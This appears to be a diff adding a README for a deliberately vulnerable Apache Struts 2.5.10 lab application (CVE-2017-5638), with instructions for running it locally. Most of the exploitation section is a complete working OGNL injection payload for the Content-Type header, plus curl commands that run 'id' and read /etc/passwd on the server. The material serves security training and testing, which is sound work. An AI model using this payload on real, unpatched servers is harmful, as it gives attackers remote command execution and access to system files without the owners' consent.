@@ -1,0 +1,41 @@
+:source-highlighter: pygments
+
+= Apache Struts CVE-2017-5638 exploitation
+
+This simple web application is built with vulnerable Apache Struts 2.5.10 (CVE-2017-5638). It's vulnerable to RCE.
+
+== Starting web application
+
+To start vulnerable web application, execute:
+----
+mvn jetty:run
+----
+The application will be accessible on port `8012` by default. You can change it:
+----
+mvn -Djetty.http.port=<port> jetty:run
+----
+
+== Accessing web application
+
+To access the vulnerable web application, open the following link in your browser: http://127.0.0.1:8012/struts-rce. If you changed the default port, modify the link accordingly.
+
+== Exploiting web application
+
+The vulnerability can be exploited to run arbitrary command on server side (RCE). The payload is included in `Content-Type` HTTP header.
+The following payload will execute the `id` command:
+[source,http]
+----
+Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder({'/bin/bash','-c','id'})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+----
+
+The following command will execute `id` command on the server side:
+[source,bash]
+----
+curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder({'/bin/bash','-c','id'})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://127.0.0.1:8012/struts-rce/index.action
+----
+
+The below one will execute `cat /etc/passwd`:
+[source,bash]
+----
+curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder({'/bin/bash','-c','cat /etc/passwd'})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://127.0.0.1:8012/struts-rce/index.action
+----
